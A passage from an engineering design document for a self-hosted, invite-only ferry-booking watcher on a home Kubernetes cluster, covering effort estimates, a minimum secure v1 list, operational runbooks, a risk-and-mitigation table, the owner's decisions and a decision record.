| | OIDC sign-in (RP client and verification with an `alg` allowlist, sessions with 24 h re-verification, bearer and session-bound WebSocket auth, per-client pre-auth limits, invitations, unmatched identities, SPA sign-in and callback, fake issuer, S-IOS without enrolment cases) | 4-5 |
| | Frontend (§10 items 1-5, 7-9) | 5-6 |
| | Chart, VAP, envtest matrix, `can-i`, helm-unittest, network policies | 5-6 |
| | CI compose and kind-lite jobs | 2-3 |
| | home-cluster PR, deploy, post-deploy smoke, S-DRAIN, cutover | 4-5 |
| | **M1 total** | **66.5-81.5** |
| M2 | Web Push, service worker, onboarding, S-PUSH | 3-4 |
| | Admin Fleet and Users, Add person, limits with provenance, suspend, delete | 4-5 |
| | Delete-my-data, retention jobs | 1-1.5 |
| | Brake persistence, breaker | 1.5 |
| | Cross-tenant suite | 2 |
| | home-cluster Authelia policies, disclosure, restore rehearsal | 1.5-2 |
| | `fw-ns-objects` VAP, live `can-i` matrix (from the old M3) | 1-1.5 |
| | SES production access (from the old M3) | 0.5 |
| | Soak fixes, household and wider stages | 2-3 |
| | **M2 total** | **16.5-21** |
| | **Total to non-household invitees** | **90-111 days ≈ 18-22 weeks** |

- **What round 3 changed:** W0 +0.5 (S-CIL and S-TR test the hold-egress flip and the UPDATE rule). M1
  +3.5-4.5: the poll curve and short checks (+2-2.5, net of the removed Dormant/Waiting/409 paths), hold
  egress (+2-2.5, about half of it the pod-lock VAP moved from the old M3), and OIDC −0.5 (no enrolment
  cases with `one_factor`). The old M3 (6.5-10) is gone: S-3DS (2-3), the runner hardening and the database
  variant (most of 1.5-3) and the lock VAP (moved to M1) leave, and its remainder (the `fw-ns-objects` VAP,
  SES production access and soak fixes) joins M2, which grows from 14-18 to 16.5-21. Net: 90-113 became
  90-111.
- What round 2 changed, for the record: W0 lost the live spikes (3-4 days) and S-SBX (about 1 day); M1 gained
  OIDC (+3-4), production detection and fixture capture (+2-3) and about 1 day of review fixes; M3 lost the
  sandbox (3 days); M5 left the plan.
- If S-IOS fails, its fallbacks add about 1 day to M1. The optional sandbox hardening (about 4 days: S-SBX
  about 1 plus about 3, M4) is outside the total.
- The owner is on the new stack after W0 + M1: 73.5-90 days, about 14.5-18 focused weeks.
- Calendar time adds the owner's 7-day soak (overlapping M2 work), the 14-day household stage (overlapping
  M2's last few days of work) and the 14-day wider stage: about 21-25 calendar weeks to the end of M2.
- For calibration: ops-scale-fairness estimated 15-17 weeks plus spikes, security-maximal about 20 weeks, and
  lean-home-cluster 35-45 focused days for a much smaller scope (SQLite, one process, k3d). The draft's 12
  weeks double-counted spike time and understated the control plane.
- If the owner wants the household sooner, the cheapest further cuts are: email-only alerts for the household
  (Web Push moves to the wider stage, −3 days before the household) and managing household limits by values
  PR instead of the Users page (−3 days). Neither weakens a security guarantee.

### 12.4 Minimum secure v1 (all required before the first non-household invitee)

- Guest-only, no BC Ferries credentials anywhere (the login code present but disabled); guest checkout
  assumed, with production detection and the alert-only switch (§5.7).
- One bare pod per trip being checked (warm or short check) with `restartPolicy: Never`,
  `activeDeadlineSeconds` and the agent's compiled maxima.
- Only ferry-control creates pods, through `fw-browser-pod`, PSA restricted and the ResourceQuotas (including
  `NotTerminating pods: 0`). No SA token in pods. ferry-web has no Kubernetes RBAC. The RBAC forbidden list and
  `can-i` negatives in CI and on the cluster. `fw-browser-pod-lock` on (from M1, limiting ferry-control's
  patch to the egress label) and `fw-ns-objects` on.
- The typed agent protocol with no page operations; TokenReview binding with the pod-name check; the enum-only
  termination message.
- The in-pod gate: Ed25519 ticket bound to owner, trip, pod and cart_id; 60 s; single use; nonce lock with an
  atomic check-and-set; single viewer; Origin check; ping liveness; revocation at hold end. Hold caps
  enforced in all five places of C17: the agent, web refusing to mint, the operator's clock, Xvnc
  `-MaxConnectionTime` and `activeDeadlineSeconds`.
- Xvnc on a unix socket only, with fail-closed listener and lockdown self-tests; kiosk mode with managed
  policies. (The Chromium sandbox is optional hardening, not part of this line; R2.)
- Static vnc-edge with the stock client and build-computed CSP; pods never serve HTML; every Cookie header
  stripped on both routes, and Authorization on the VNC route.
- Egress: the allowlist CNP (`toFQDNs`, or the `toCIDRSet` fallback) plus default deny, and the hold-egress
  CNP with ferry-control's label flip (or, if S-CIL rules it out, public HTTPS always, §7.6), both states
  verified by the post-deploy smoke; `nameError` set; the blocked-frame detector.
- The browser namespace without `components/common`, excluded from Fluent Bit and the descheduler.
- Identity: app-native OIDC with `id_token` verification (`alg` allowlist) and the cookie-less bearer
  session re-verified with the IdP every 24 h, with sockets bound to their session (C29), the code and token
  kept out of URLs (C15), and per-client pre-auth limits; the app's invitations; Authelia
  `authorization_policies` on the `ferry-watch` client (`one_factor`) and on every other client; each
  invitee's email deliverable; the "Removing a person" runbook (§12.5).
- The user-scoped repository returning 404 for foreign ids; the cross-tenant suite green.
- Limits: `maxTrips`, `maxActiveBrowsers = 1`, one hold per user (cart claims), holds/day, VNC minutes/day,
  the 30-day horizon, the poll curve with its 30 s floor; admin Users and Fleet pages.
- Web Push plus email; the persisted brake with the 30 s agent floor.
- SES production access; Q1 decided; tenants told about R1 (cluster-admin visibility, including the CI
  runner), R4 (naming Cloudflare), R22 (open egress during holds), and that the service works only from
  Canada and the US. (Round 3 removed the runner restriction and the database variant from this list;
  both are stated residuals.)

Everything in M4 is post-v1. None of it is needed for the guarantees the owner asked for.

### 12.5 Runbooks

**Cutover and rollback (M1).**
1. Before: the new stack has run on `ferry-next.chestr.dev` with the owner as its only user, and the owner has
   signed in there at least once (so their uid exists); a revert PR is prepared, pinning the legacy image by
   digest (today it is tag-only, `ghcr.io/mchestr/ferry-watch` `0.5.1`,
   `default/ferry-watch/app/helmrelease.yaml:20-22`).
2. In the legacy dashboard, turn off "Watch all trips" (`PATCH /api/settings` `enabled=false`) and release any
   held carts.
3. Copy `config.json` and `alerted.json` out of the legacy pod (`kubectl cp`, cluster admin).
4. Look up the owner's uid from their first sign-in (`ferry-watch-control admin uid --username <name>`, which
   reads the `identities` row; Authelia's `sub` is opaque, so the uid can't be computed before that sign-in)
   and run `ferry-watch-control admin import --user <uid> config.json alerted.json` as a one-off Job.
5. One home-cluster PR: the legacy HelmRelease to `replicas: 0` with its HTTPRoute disabled; the legacy PVC
   annotated `kustomize.toolkit.fluxcd.io/prune: disabled`; the new values `routes.dashboardHost:
   ferry.chestr.dev`. Never two routes for one host at once (UniFi DNS would conflict).
6. Go/no-go within 30 min: post-deploy smoke green (including the echo check and an unauthenticated 401);
   the owner signs in on `ferry.chestr.dev`; imported trips Watching; a test alert arrives.
7. Rollback, any time until step 8: merge the revert PR (legacy replicas 1 and its route back; the new
   route back to `ferry-next`), then set legacy `enabled=true`. The legacy PVC still holds its state. If guest
   checkout fails and the owner wants logged-in checkout back while the new stack keeps serving invitees,
   the legacy app can instead run next to it on an envoy-internal host (for example
   `ferry-legacy.chestr.dev`, LAN and WireGuard only), never on `ferry.chestr.dev`; it then shares the home
   IP's check budget.
8. Only when **all** of these hold: at least 14 days since cutover; at least one real guest checkout
   completed on the new stack (outcome `booked`, or a "Yes" to "Did you book it?"); and no forced login wall
   and no `guest_checkout_failing` alert since. Then: delete `kubernetes/apps/default/ferry-watch` (its PVC is
   pruned; VolSync snapshots stay in R2 for their 7 daily copies,
   `components/volsync/r2/replicationsource.yaml:23-24`); remove only that app's reference to the
   `pushover` 1Password item (the item itself serves kube-prometheus-stack, gatus, sonarr, radarr and
   qbittorrent); delete `BCF_USER` and `BCF_PASS` from the 1Password item `ferry-watch`; remove the
   `ferry-next.chestr.dev` redirect URI from the Authelia client (it may go earlier). Until then the legacy
   HelmRelease stays at `replicas: 0` with its route off, its 1 Gi PVC kept and the two BC Ferries fields
   kept: the owner's only logged-in checkout path, and the cheap half of the "adjust later" door.

**Inviting a person (M2+).**
1. Make sure their email is deliverable (for the invitation and cart alerts): SES production access, or add
   the address as a verified SES identity and wait for them to confirm.
2. In the lldap UI (LAN only): create the user (username, email, display name) and add them to group
   `ferry-watch`.
3. Send them a generated password (16+ random characters) out of band. It is their only factor
   (`one_factor`, round 3) and they can't change or reset it remotely; a reset needs the admin.
4. On the Ferry Watch Users page: **Add person** (username, email, optional overrides, reason). This creates
   an invitation that binds at their first sign-in (valid 30 days). The app sends the `invited` email:
   - sign in at the link with the password you were sent, and allow Ferry Watch on the consent screen
     (ticking "remember", so it is not asked again); there is no second factor to set up;
   - tick "Remember me", so Ferry Watch can sign you back in without asking for up to 6 months; otherwise
     you will be asked again after 3 idle days;
   - three wrong passwords in an hour lock you out for a day (or an hour, if Q2 softens it);
   - on iPhone: Share → Add to Home Screen, open it from the icon, allow notifications, and allow Ferry Watch
     during Sleep/Focus; your first sign-in is easiest in Safari or on a computer;
   - send yourself a test alert;
   - it only works from Canada or the US (sign-in and checkout both), including when you travel;
   - how checking works: your nearest trip within 7 days is watched closely (every 5 min a week out, down to
     every 30 s in the last 6 hours); your other trips are checked every 6 hours; trips can be at most 30 days
     ahead; between 23:00 and 06:00 you get alerts but no held cart;
   - check out as a guest, and don't sign in to your BC Ferries account during checkout: BC Ferries doesn't
     accept a sign-in while a cart is held, and your password would pass through the same unencrypted path
     as your card;
   - after a checkout we can't confirm, the trip waits for your answer to "Did you book it?" before it is
     watched again;
   - what we can see: the cluster admin, and the automation that runs with their rights, can technically see
     everything; checkout keystrokes pass through Cloudflare and our servers unencrypted for a moment; your
     card is never stored; checkout is as a guest; while you hold a cart, the browser can reach any website,
     from our home connection.
5. Check the Users page shows the person as active (invitation used) with push enabled.

**Removing a person.** Authelia re-checks the group only when the person's session next goes back to it
(within 24 h, R20), so the app comes first:
1. On the Users page: **suspend** (with a reason). This revokes every session, closes their sockets and
   drains their pods at once (a held cart is released, or allowed to finish, by choice).
2. In the lldap UI: remove them from group `ferry-watch` (or disable or delete the user).
3. If they won't come back: **delete user** in Ferry Watch (user, `identities` row, push subscriptions,
   trips) *before* deleting or renaming them in lldap, and never give their username to someone else
   (R21). The same applies to resetting a compromised account: suspend first, reset in lldap, then
   reactivate.

**Talos upgrade** (holds on a drained node are released with an alert; accepted, round 3). §7.8: turn on
"Pause carting", wait until the Holds panel is empty (at most the hard cap),
merge the Renovate PR, turn carting back on when tuppr reports the upgrade complete.

**Restoring the app's database.** Put the fleet loop in maintenance (no starts); scale ferry-web and
ferry-control to 0 (pods keep their holds and slow down); restore the chosen pg_dump from the NFS share
(`components/cnpg/cronjob.yaml`) into a new database as the owner role; verify; swap names; scale back up.
Agents reconnect and replay; carts are unaffected. The shared cluster's PITR is not used for one app, because
it would roll back Authelia, lldap and Immich too.

**Replacing the IdP.** §6.2.6.

**Break-glass (cluster admin only).** `kubectl logs` on a retained failed pod; deleting a stuck pod; never
exec into or screenshot a pod that holds a cart.

---
## 13. Risks and mitigations

| Risk | Likelihood / impact | Mitigation |
|---|---|---|
| Guest checkout doesn't work, or not for some fare or vehicle types | Medium / high | Assumed to work, with no spike (owner, round 2). Production detection (forced login walls, "Did you book it?" reasons, outcome metrics and the per-hold outcome record, the `guest_checkout_failing` alert on the first forced wall); the immediate fleet-wide alert-only switch and per-fare/vehicle alert-only; the legacy app kept restorable until a guest checkout has worked (§12.5); the login code, `checkout_mode` and the VAP's `optionalEnv` keep an account mode possible (§5.7). |
| A BC Ferries or Queue-it block of the home IP (household too) | Medium / high | The poll curve (typically 2-5 checks/min, about 14 worst case), the 20/min budget (ceiling 40), start throttle, persisted brake (on Queue-it detours or any 403/429/challenge), breaker, fail-slow agents, maintenance switch. A compromised pod can bypass these (R13). |
| VAP or RBAC drifts from the template | Medium / critical | Template and VAP are written together; leak matrix, `can-i` and helm-unittest block CI; allowlist-style CEL; PSA as a second fence; the pod-lock VAP from M1 (it fences ferry-control's label patch), the namespace-objects VAP from M2. |
| Cilium `toFQDNs` or the DNS proxy misbehave (never used here) | Medium / medium | `nameError` plus fully qualified names; S-CIL in W0 with both resolvers; `toCIDRSet` fallback; the post-deploy smoke after every deploy. |
| The hold-egress label doesn't apply in time, so the payment or bank page doesn't load (R16) | Low / high | S-CIL measures the flip; retries every 5 s; the blocked-frame detector with a user message and admin alert; "Release and book it myself"; fallback to public HTTPS always (§7.6). |
| A tenant browses other sites from the home IP during a hold, or code in a holding pod uses the open egress (R22) | Low / medium | Only during the tenant's own hold (60 min hard cap, 4 holds a day); kiosk mode with no address bar; private and cluster destinations always denied; outside holds the allowlist applies. Accepted by the owner (round 3). |
| A trip that isn't the user's nearest misses a short-lived opening | Medium / medium | By design (round 3): such trips are seen every 6 h; a manual "check now" (6/h) starts a short check; the trip becomes warm when it is the nearest within 7 days; an admin can raise a user's `maxActiveBrowsers` (Q3). |
| A checkout is cut off mid-payment | Medium / high | Payment guard pauses session clocks; no navigation away while paying; the 30-minute session default tuned from `ferrywatch_checkout_seconds`; `hold_ending` warning at T−5. |
| VNC reconnects fail on phones (bank-app switch, network change, Cloudflare idle) | Medium / high | 20 s pings; reconnect with `N` replaces stale sockets; shim reload until the deadline; only failed upgrades count; S-VNC-lite on three clients. |
| The device that opened checkout is lost (iOS home-screen storage) | Medium / medium | No automatic open; device choice on `/c`; `N` reused across returns; S-VNC-lite checks the iOS path; no takeover ticket (round 3): iPhone users check out in Safari or on a computer if it fails. |
| The stock KasmVNC client changes on upgrade | Low / medium | No bundle patch; a CI test drives the client through the shim against a fake gate. |
| Memory is higher than measured (heavy pages, tmpfs, checkout) | Medium / medium | S-MEM measures the cgroup working set including tmpfs; podMemory starts at 1.5 GiB; disk cache capped; recycle at 85 % while Watching, alert while Holding; quota backstop. |
| A Talos upgrade releases a hold (R8) | Medium / low | "Pause carting" runbook; orderly release with an alert; hold PDB plus `drainTimeout` in M4 if it bites. |
| A session token stolen through XSS on the dashboard origin (R17) | Low / medium | The strict hash-based CSP (blocks injection and fetch/form exfiltration, not navigation); the 24 h IdP re-verification, which a thief can't pass; idle and absolute expiry; server-side revocation (logout, "sign out everywhere", suspension); VNC still needs the pod's ticket and first-viewer lock. |
| Someone removed in lldap keeps app access (R20), or a reused username inherits an old account (R21) | Medium / medium | The "Removing a person" runbook suspends in the app first; 24 h re-verification bounds the rest; usernames are never reused, and a sign-in with a changed email is flagged. |
| Sign-in from the iOS home-screen app lands outside the app (R18) | Unknown / medium | S-IOS on the owner's iPhone in M1; the handoff-code fallback (§6.2.4). |
| The OIDC issuer is unreachable from ferry-web (egress rule, Authelia down) | Low / medium | S-OIDC proves the rule; existing sessions keep working (only new sign-ins need the issuer); SignInErrors alert. |
| Invitees can't log in (1-day ban, geo-block, a lost password) | Medium / medium | `one_factor`, so no enrolment step (round 3); a generated password sent out of band; onboarding email; Q2 on the ban; the invitation says Canada and the US only. |
| iOS Web Push lapses, the app isn't installed, or Focus silences it | High / medium | Email for every cart alert; push health on the Account card; reminder at 15 min; no cart held during quiet hours (23:00-06:00); onboarding asks to allow Ferry Watch in Focus. |
| PCI and ToS exposure (keystroke relay, automated carting for several people) | Unknown / medium | Disclose to tenants (naming Cloudflare). No payments taken. Short holds, one hold per user, per-user caps, quiet hours, the poll curve, no account automation. The desktop user agent is kept (owner, round 3). |
| A compromised web races a first VNC connection (R3) | Low / medium | First-viewer lock (visible, before card entry); accepted for invite-only (round 3); S-VNCID in M4. |
| A Chromium exploit in an unsandboxed browser, or a side channel on `mitigations=off` nodes (R2) | Low / high for that tenant's checkout; critical if chained with a kernel bug (every node is a control-plane node) or a ferry-control parser bug | Per-pod isolation, no secrets, no token and the egress allowlist contain an exploit to one tenant's pod while the kernel and the parser hold. Recommended (pending the owner, Q1): accept for now, with the optional sandbox hardening (M4, about 4 days) before inviting people the owner doesn't know well. |
| The self-hosted runner is reachable from fork PRs (R1) | Unknown / critical | Left as is (owner, round 3); tenants are told the cluster admin and its automation can see everything. |
| The effort runs over | Medium / medium | Bottom-up estimate with ranges; explicit cut line (§12.4); M4 holds everything not needed for the owner's guarantees. |

---

## 14. Open questions for the owner

### 14.1 Decided

"First list" is the numbering of the first review (Q0-Q16); "round-2" is the numbering the owner answered in
round 3 (Q1-Q12). Round 3 answered every round-2 question except the sandbox (round-2 Q12, now Q1 below) and
two small points that now stand alone (Q2, Q3).

| Asked as | Question | Answer | Where it lands |
|---|---|---|---|
| first list Q0 | Identity | Round 2: "Can we use oidc?": yes; app-native OIDC with a cookie-less app session. | §6.2, C29, R17-R21 |
| first list Q1 | Pre-cart sign-in window | Round 2: no. VNC only while a cart is held; attended sign-in is a possible future option. | §5.7, §15 |
| first list Q2, Q3, Q3b | Live booking spike; guest checkout, the owner included | Round 2: no spike, assume it works, no one-way doors; guest accepted "for now"; signing in to BC Ferries during checkout probably won't work and is advised against. | §5.7, §12.1 |
| first list Q6 | Lua or a separate domain | Planner: mostly moot (the app sets no cookie); a separate domain stays possible later (R12). | §6.2.1, R12 |
| round-2 Q1 | VNC first-connection race (R3) | Round 3: accepted for invite-only; S-VNCID stays in the backlog. | R3, M4 |
| round-2 Q1b | iOS takeover ticket | Round 3: no. iPhone users who lose the device lock check out in Safari or on a computer; revisited with the owner's M1 data. | §5.5 |
| round-2 Q2 | After a viewed checkout with no confirmation | Round 3: the trip pauses until "Did you book it?" is answered; "Yes" archives, "No" resumes; no automatic resume; the viewed sailing is never re-carted. | §3.6 step 8, §8.1 |
| round-2 Q3 | Per-user defaults, horizon, polling, quiet hours | Round 3: `tripHorizonDays` 30; one warm browser on the nearest trip within 7 days, on the curve 5 min / 2 min / 60 s / 30 s (±15 %); short checks every 6 h (up to daily) for other trips, not counted against `maxActiveBrowsers`; quiet hours 23:00-06:00 Pacific alert only; 4 holds and 6 cart attempts a day, 60 VNC minutes, hold clocks 30/30/10/60 min, one hold at a time. | `polling.py`, §6.6, §8.2, §9.3 |
| round-2 Q4 | BC Ferries etiquette | Round 3: 20 checks/min (ceiling 40), brake on Queue-it detours or 403/429; keep the desktop UA. | §9.3 |
| round-2 Q5 | Holds during Talos upgrades | Round 3: released with an alert; the runbook pauses carting first; hold protection in the backlog. | §7.8, §12.5 |
| round-2 Q6 | Invitee sign-in | Round 3: `one_factor` for the `ferry-watch` client (no enrolment); the other clients keep their policies, and their group restrictions still come before anyone new joins lldap. (The ban-time half is Q2 below.) | §6.2.3, §6.2.9 |
| round-2 Q7 | Admin access | Round 3: no admin VNC, exec or screenshots in the app; tenants told the cluster admin can see everything. | §6.2.8, R1 |
| round-2 Q8 | 3DS egress | Round 3: open public HTTPS egress while a cart is held; private, cluster, node and metadata ranges stay denied; browsing from the home IP during one's own hold accepted. Mechanism (planner): the allowlist always plus a hold policy keyed on a label only ferry-control may change (§7.6 option A). | §7.6, C20, R16, R22 |
| round-2 Q9 | Postgres superuser Secret | Round 3: keep the standard `components/cnpg` permanently; accepted residual. | R14 |
| round-2 Q10 | Self-hosted CI runner | Round 3: leave as is; a residual stated to tenants. | R1 |
| round-2 Q11 | Travelling invitees | Round 3: geo-block unchanged; onboarding says Canada and the US only. | §2.2, §12.5 |
| — | Checkout host | Round 2: `ferry-checkout.chestr.dev`. | §3.3, §7.9 |

### 14.2 Still open

Each has a recommended default; none is needed for W0 or M1.

1. **Q1 [round-2 Q12] Sandbox and kernel flags (R2).** Having read R2: accept Chromium without its sandbox on
   `mitigations=off`, `apparmor=0` nodes for now (an exploit reaches that tenant's checkout, and the whole
   cluster only if chained with a kernel or ferry-control parser bug), with the sandbox hardening (about 4
   days plus a per-node Talos change) as an optional backlog item? Or make it a gate before non-household
   invitees (M2's wider stage grows by about 4 days)? Round 3's open hold egress (R22) gives a holding pod's
   code more reach, which argues a little more for the hardening. **Default: accept for now; do the
   hardening before inviting people you don't know well.** Needed before the first non-household invitee.
2. **Q2 [round-2 Q6, second half] Authelia's lockout.** Three wrong passwords in an hour ban an account for a
   day, cluster-wide. With `one_factor` the password is an invitee's only factor, but it is a generated one,
   so softening `ban_time` to 1 h (still at most 72 guesses a day) costs little and stops a mistyped password
   locking someone out of a hold for a day. **Default: soften to 1 h (cluster-wide, your call).** Needed
   before the first invitee.
3. **Q3 [round-2 Q3b] Outbound and return pairs.** With the warm browser on the nearest trip, a return
   sailing gets only 6-hourly short checks until the outbound has sailed. Should a pair share one warm browser (both
   checked on the curve)? **Default: no pairing in v1**; raise that user's `maxActiveBrowsers` to 2 if
   needed (holds stay one at a time). Any time.

## 15. Out of scope

- Stripe or any payment; the Ko-fi link is a plain URL.
- Storing BC Ferries credentials anywhere (Secrets, 1Password/ESO, Vault, the DB, a PVC), a dashboard
  credential form, or a pod-served credential page.
- Pushover as a user channel; SMS in v1.
- CRDs and a kubectl-native trip view; a Go controller; kopf.
- Namespace-per-tenant. It is revisited only before shipping any mode that persists a per-tenant credential or
  browser profile.
- Admin or break-glass VNC, exec or screenshots in the app; tenants seeing any other tenant's data.
- Cross-tenant search deduplication.
- An HA multi-replica control plane; an egress gateway or a second egress IP.
- A "watch my browser" view outside holds. (Pre-cart VNC for a sign-in is not out of scope for good; it is
  a deferred option below that needs the owner's explicit decision.)
- Public sign-up; users outside Canada and the US (the Cloudflare geo-block, unchanged in round 3).
- The single-container personal mode (owner decision 5); arm64 images (not built today).
- One browser per *route* shared across dates or users: the unit of watching is a trip (route + date + party),
  because each trip has its own search, cart and owner; sharing one browser across tenants would make one
  tenant's page drive another's alerts (the dedupe problem above).
- An inactivity pause of trips (removed, §8.1).

**Deferred, possible future options (none designed out, each needs the owner's decision):**
- **Any pre-cart VNC, as an attended BC Ferries sign-in before a cart** (the former M5; first-list Q1, answered "No"
  for v1 in round 2). The user would type their BC Ferries password into the real bcferries.com page in their
  own pod, during a VNC window of at most 10 min, before any cart exists, with cookies in tmpfs only. Adding
  it undoes nothing (the kept login code, `checkout_mode`, the VAP's `optionalEnv`, the ticket's `aud` and
  C22's checkout scope, §5.7), but it is real work, about 1.5 weeks (the old M5 estimate):
  - an exception to decision 3, which means reopening first-list Q1 with the owner;
  - a new ticket audience (`fw-vnc-signin`, no `cart_id`) with its own step-2 condition at the gate (§5.5);
  - C22's sign-in-viewer branch: a pod whose only viewer was a sign-in viewer goes on watching, logged in;
  - "cart held" in C17's five layers becomes "cart held or sign-in window open", with a sign-in-minutes
    budget checked when web mints;
  - an is-logged-in probe, because today login state is set once and never re-checked (`site.py:301`);
  - the sandbox hardening first (R2), spikes S3/S4 [R:billing-guest-mode-credentials "spike plan"], and an
    origin assertion before typing into `/login` (`site.py:278-301`).
- **An account checkout mode** in general, if guest checkout turns out not to work for some fares or at all
  (§5.7 adjustment path). Stored credentials stay excluded (decision 1), so the attended sign-in above is
  the candidate. A user-requested re-cart of a viewed sailing in a logged-in session would be C22's second
  named branch.
- **The Chromium sandbox and kernel-flag changes** (optional hardening, R2, §12.2 M4; Q1).

---

## Appendix A: Decision record (D1-D18)

| Id | Decision | Why |
|---|---|---|
| D1 | Two single-replica Recreate Deployments from one control image: `ferry-web` (internet-facing, no k8s RBAC) and `ferry-control` (the operator: reachable only from browser pods, `tokenreviews create`, `pods` in one namespace, nodes read), plus a static `vnc-edge`. They coordinate only through Postgres rows and NOTIFY under separate roles; each is fenced by an advisory lock. | It keeps internet input away from `pods/create` and from the pod-facing parser [R:map-threat-model]. Merging hub and fleet removes four DB-mediated protocols and their chaos tests, and matches the owner's description of the operator. The cost (a parser exploit reaches VAP-pinned pod create) is stated in C3 and §4.5. |
| D2 | Postgres on CNPG `postgres17` (`ferrywatch`) through the standard `components/cnpg`; superuser used only by the stock `postgres-init` Job; per-process login roles as CNPG managed roles; migrations as the owner role in a separate Job; RLS on the outbox, immutable `trips.user_id`, INSERT-only audit. Defaults and ceilings in Helm values. No CRDs. | Quota admission needs transactions; audit and usage must be queryable and backed up; the cluster convention requires it. Our image never holds the superuser. The superuser Secret in the namespace is accepted permanently (owner, round 3; R14). |
| D3 | One shared `ferry-watch-browsers` namespace, chart-made without `components/common`, PSA restricted, default-deny. | In guest mode there is no tenant Secret or PVC; ownership is enforced cryptographically in the pod. Per-tenant namespaces would need GitOps toil per invite or namespace-create rights for the operator. Revisit before any stored-credential mode. |
| D4 | Python 3.12 with lightkube `AsyncClient`. A level-triggered loop (pod and node watch, a 10 s list, Postgres LISTEN), deterministic names, `Cluster` Protocol plus `FakeCluster`, envtest from pytest. No kopf, no Go. | One language shares the models, protocol and limits resolver, so there are no drifting duplicate security checks. |
| D5 | Fat agent: today's Watcher for one trip, owning cart, timers (with the payment guard), back-off, gate and a local bucket, clamped to compiled maxima. It dials out over WS. Protocol §5.3, with no page-control operations. | Holds and VNC gating must survive control-plane outages. A thin RPC agent would put carts on the network path and keep a remote caller one step from page control. |
| D6 | Projected SA token (audience `ferry-watch-agent`, 600 s), TokenReview with pod-uid and pod-name at connect, binding to the `browser_pods` row written before the pod existed, one socket per uid, every message's trip checked. | Bound tokens die with the pod and are useless against the API server. The binding anchors in a row written by the operator, not in anything the agent asserts. The draft's 5-minute re-review is unnecessary once the fleet loop closes a deleted pod's socket itself. |
| D7 | Static `ferry-checkout.chestr.dev` route (Cookie and Authorization stripped) → stock-client `vnc-edge` (upgrades only) → pod gate → Xvnc unix socket. web mints a 60 s Ed25519 ticket bound to `sub == FW_OWNER`, trip, pod and `cart_id`, carried in the URL fragment and a subprotocol (via a shim), never in a URL a server sees. First-viewer lock via a client nonce, atomic, with preemption by the lock holder and ping liveness. The alert link is `/c/<trip>`, a device chooser. | The in-pod check must be cryptographic (SNAT). Pods must not serve HTML on a chestr.dev origin. The lock stops a compromised web taking over after the user connects. A unix socket closes the page-JS path by construction. No bundle patch to maintain. |
| D8 | Guest-only at launch, the owner included (accepted "for now"), assumed to work without a live spike. Production detection, the fleet-wide alert-only switch and per-fare/vehicle alert-only are the adjustment path; the login code (disabled), `checkout_mode` and the VAP's `optionalEnv` keep an account mode possible. No pre-cart sign-in window in v1 and never as an automatic fallback (first-list Q1, "No"; a possible future option that needs the owner's decision, §15). The legacy app stays restorable until a guest checkout has worked (§12.5). Never a dashboard form, a Secret, ESO or a pod-served page. | With no stored credential, no component can leak one. The owner asked for no one-way doors on guest checkout (round 2). |
| D9 | Cilium `toFQDNs` plus DNS L7 allowlist with `nameError` and fully qualified names (`toCIDRSet` fallback), opened to public HTTPS while a cart is held (D18). Kiosk mode and managed policies in 3 directories with fail-closed self-tests. Xvnc on a unix socket only, NeverShared/DisconnectClients=0, `-MaxConnectionTime 6000`, never MaxIdle, MaxDisconnection, IdleTimeout or DLP_KeyRateLimit. PSA restricted, read-only, uid 1001. The Chromium sandbox (Localhost seccomp profile plus the sysctl) and `hostUsers: false` are optional hardening driven by VAP params, the owner's call. | Cilium makes a forward proxy optional. REFUSED breaks search lists. containerd's default seccomp blocks Chromium's namespace sandbox. Unsandboxed Chromium on `mitigations=off` nodes is the largest residual (R2); the planner recommends accepting it for now, pending the owner (Q1), and the params make adding the sandbox a values change. |
| D10 | `min(override ?? default, GitOps ceiling)`. Five enforcement layers. Queued, not Pending. Admin Fleet and Users pages with mandatory reasons and INSERT-only audit plus a log line. No admin VNC, exec or screenshots. One warm browser per user by default, chosen automatically (D17); one hold per user. | Ceilings plus compiled maxima mean neither a compromised web nor the operator can make holds or honest polling unbounded. |
| D11 | Phases Off, ShortChecks, Queued, Starting, Watching, Holding, Draining, BackingOff, NeedsAttention, Past (round 3 removed Dormant and Waiting). `restartPolicy: Never`, 26 h deadline, about 24 h recycle. A viewed hold always ends in pod exit, then archive (booked) or "Did you book it?", with the trip paused until answered (round 3). SIGTERM drain, no hooks. Bare pods with no anchor and no hold PDB in v1. No inactivity pause. | Fixes today's lost-cart shutdown and "forever" holds. Talos drains bare pods with `Force` and fails upgrades on blocked evictions, so a PDB would fail upgrades and an anchor adds a GC hazard. |
| D12 | The poll curve (D17) with ferry-control's proportional stretch above the budget (20/min default, 40 ceiling; owner, round 3), enforced by the agent bucket with a compiled 30 s floor. The desktop UA stays. Start throttle. Persisted brake and a simple breaker with manual close. Fail-slow. No cross-tenant dedupe. | One residential IP is shared with the household. Agent-side enforcement means no outage or control-plane compromise can speed an honest agent up; a compromised pod can (R13). |
| D13 | Only web sends, from a Postgres outbox: Web Push by default plus email via smtp-relay; no Pushover. Typed kinds, templates on the server, links only `/c/<trip>` or `search_url`. Ko-fi as a validated plain link. | Owner decisions. Server-side templates stop pods injecting phishing links; the outbox survives restarts. |
| D14 | **Round 2:** app-native OIDC against Authelia's existing provider (confidential client, Authorization Code + PKCE S256, code in the URL fragment, `id_token` verified by the app), with a cookie-less app session (opaque bearer token in the SPA, hash stored, idle and absolute expiry, re-verification with the IdP every 24 h, server-side revocation, session-bound WebSocket first-message auth). The dashboard route has no gateway auth and drops every Cookie header. `IdentityProvider` interface with issuer, client and claims as config; deterministic `uid = hash(iss, sub)` with GitOps aliases; invitations bound at first sign-in; `bootstrapAdmins` plus a DB flag; trusted headers only as a LAN/dev adapter. | The owner asked for OIDC. It fails closed and is testable without the gateway, unlike ext-auth headers or EG's OIDC with `claimToHeaders`. Setting no cookie lets the route drop the owner's Authelia cookie without Lua or a new domain. A deterministic uid lets the pod verify ownership without trusting DB mappings, and survives an IdP swap through aliases. Costs: R17-R21 and 3-4 days. |
| D15 | A uv workspace (core, control, agent) with import-linter. Images: control, browser, vnc-edge, plus CI-only agent-e2e and fake-bcferries. A public OCI Helm chart from this repo; cluster-specific bits in home-cluster. Test tiers: unit, Postgres, envtest (VAP matrix, `can-i`), compose integration, kind-lite, home-cluster post-deploy smoke. | Matches the owner's OCI Helm and digest conventions and keeps Playwright out of the control plane. The VAP and RBAC are the isolation, so their negative tests block CI; network behaviour can only be proven on the real cluster, so it gates deploys. |
